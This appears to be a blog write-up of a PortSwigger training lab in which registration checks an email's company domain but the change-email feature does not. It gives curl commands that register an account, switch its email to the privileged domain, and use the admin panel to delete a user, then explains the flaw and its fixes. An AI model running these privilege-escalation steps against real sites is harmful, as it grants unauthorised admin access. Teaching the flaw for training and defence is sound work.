---
layout: post
title: "PortSwigger: Inconsistent security controls"
date: 2027-11-02 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, BusinessLogic]
tags: [portswigger, business-logic, logic-flaw, access-control, email-domain, privilege-escalation, cwe-840]
---

A company decides who counts as "staff" by looking at one thing: does your account email end in `@dontwannacry.com`? Get a staff email, get the admin panel. The catch is that the site checks that domain in one place but forgets to check it in another — so anyone can simply *change* their email to the company domain after signing up. This is a **business logic vulnerability** ([CWE-840](https://cwe.mitre.org/data/definitions/840.html)) caused by **inconsistent security controls**.

## Overview

The goal is to reach `/admin` and delete the user `carlos`. Admin access is gated on the account's email **domain**. Two different features touch that domain and they don't agree: **registration** restricts which domain you can sign up with, but the **change-email** feature on *My account* never re-validates it. Self-register on a throwaway domain, then change your email to the privileged company domain, and the admin door opens.

## The technique

Authorization should never be derived from a value the user can freely change. Here it is — your email domain — and the bug is sharpened by a missing invariant: the "your domain has been validated" rule is enforced on only one of the two paths that can set the domain.

- **Registration** runs the employee-domain check (you can't just sign up as `@dontwannacry.com` directly).
- **Change-email** runs *no* domain check at all.

So the registration gate is decorative: you walk in through the unguarded change-email path instead.

## Solution

1. Confirm the gate by hitting the admin path anonymously:

   ```bash
   curl -sk "https://TARGET/admin"
   # -> "Admin interface only available if logged in as a DontWannaCry user"
   ```

2. Register with an address on a domain you control. Use the lab's email-client subdomain so the confirmation mail is deliverable:

   ```bash
   curl -sk -c cookies.txt "https://TARGET/register" \
     --data-urlencode "csrf=<csrf>" \
     --data-urlencode "username=hacker1" \
     --data-urlencode "email=hacker1@<your-exploit-server-subdomain>" \
     --data-urlencode "password=<pass>"
   # -> "Please check your emails for your account registration link"
   ```

3. Read the confirmation link out of the email client and visit it:

   ```bash
   curl -sk "https://<your-exploit-server-subdomain>/email"          # find ?temp-registration-token=...
   curl -sk "https://TARGET/register?temp-registration-token=..."    # -> "Account registration successful!"
   ```

4. Log in, then change your email to the company domain. There is no domain check on this path:

   ```bash
   csrf=$(curl -sk -b cookies.txt "https://TARGET/my-account" | grep -oP 'name="csrf" value="\K[^"]+')
   curl -sk -b cookies.txt -X POST "https://TARGET/my-account/change-email" \
     --data-urlencode "csrf=$csrf" \
     --data-urlencode "email=hacker1@dontwannacry.com"
   # -> 302
   ```

5. `/admin` is now reachable — delete carlos:

   ```bash
   curl -sk -b cookies.txt "https://TARGET/admin/delete?username=carlos"   # 302 = deleted
   ```

The lab status banner flips to **Solved**.

## Why it worked

The admin gate trusts a **user-mutable attribute** (the email domain) as proof of employment, and the validation that is supposed to protect that attribute is applied inconsistently — registration enforces it, change-email does not. Because the gate only ever reads the *stored* domain, switching it post-registration is enough to inherit employee-only privileges. No credential theft, no injection — just a control that one code path enforces and another quietly skips.

## Fix / defense

- Don't derive authorization from a user-mutable attribute. Bind privilege to a **server-assigned role**, not the email domain.
- Apply the **same validation on every path** that can set the attribute — registration *and* change-email must run the identical domain check.
- Require **re-verification** of a new email address before it takes effect, and never treat a self-changed domain as proof of employment.
- Audit for inconsistent controls in general: list every endpoint that mutates an authorization-relevant field and make sure one shared validation function gates them all.
